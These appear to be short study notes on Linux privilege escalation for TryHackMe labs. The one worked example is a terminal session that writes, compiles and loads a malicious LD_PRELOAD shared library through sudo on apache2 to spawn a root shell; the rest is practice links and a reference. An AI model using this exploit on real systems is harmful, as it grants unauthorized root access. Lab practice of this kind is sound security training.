# Linux Privilege Escalation

## sudo (LD_PRELOAD)

```
TCM@debian:~$ cat x.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash");
}
TCM@debian:~$ which gcc
/usr/bin/gcc
TCM@debian:~$ gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
TCM@debian:~$ ls /tmp
backup.tar.gz  linpeas.sh  useless  x.so
TCM@debian:~$ sudo LD_PRELOAD=/tmp/x.so apache2
root@debian:/home/user#
```

## Linux Capabilities

[THM | Wonderland](https://tryhackme.com/room/wonderland)

# SUID / GUID

## Practice

[THM | Linux PrivEsc](https://tryhackme.com/room/linuxprivesc)

[THM | Linux PrivEsc Arena](https://tryhackme.com/room/linuxprivescarena)

## References

[swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

